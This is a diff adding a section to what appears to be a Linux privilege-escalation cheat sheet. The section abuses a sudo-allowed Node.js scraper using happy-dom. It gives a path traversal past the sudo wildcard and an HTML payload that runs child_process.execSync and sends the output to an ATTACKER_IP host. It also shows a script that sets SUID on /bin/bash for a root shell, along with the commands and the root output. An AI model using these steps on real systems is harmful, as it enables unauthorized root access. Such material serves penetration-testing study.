@@ -1309,6 +1309,57 @@ ls -la /tmp/rootbash
 
 ---
 
+### Sudo Node.js scraper with `happy-dom`
+
+A sudo-allowed Node.js HTML scraper using `happy-dom` may evaluate JavaScript embedded in attacker-controlled HTML. First enumerate the sudo rule and resolve the wrapper:
+
+```bash
+sudo -l
+# (root) NOPASSWD: /usr/bin/web-scraper /root/web_src_downloaded/*.html
+
+ls -la /usr/bin/web-scraper
+# /usr/bin/web-scraper -> /opt/scraper/scraper.js
+```
+
+Although the allowed argument begins with `/root/web_src_downloaded/` and ends in `.html`, traversal can point the scraper at an HTML file in a writable directory:
+
+```html
+<script src="http://ATTACKER_IP:PORT/'+require('child_process').execSync('id')+'"></script>
+```
+
+```bash
+sudo /usr/bin/web-scraper /root/web_src_downloaded/../../../../../../tmp/index.html
+```
+
+The resulting request to the attacker-controlled HTTP server confirms execution as root:
+
+```text
+GET /uid=0(root)%20gid=0(root)%20groups=0(root) HTTP/1.1
+```
+
+For a root shell, place the following payload in `/tmp/pwn.sh`:
+
+```bash
+#!/bin/bash
+chmod +s /bin/bash
+```
+
+Reference it from `/tmp/pwn.html`:
+
+```html
+<script src="http://ATTACKER_IP:PORT/'+require('child_process').execSync('/tmp/pwn.sh')+'"></script>
+```
+
+Run the allowed scraper, then preserve Bash's effective UID:
+
+```bash
+sudo /usr/bin/web-scraper /root/web_src_downloaded/../../../../../../tmp/pwn.html
+/bin/bash -p
+id
+```
+
+---
+
 ### nmap
 
 * Method 1
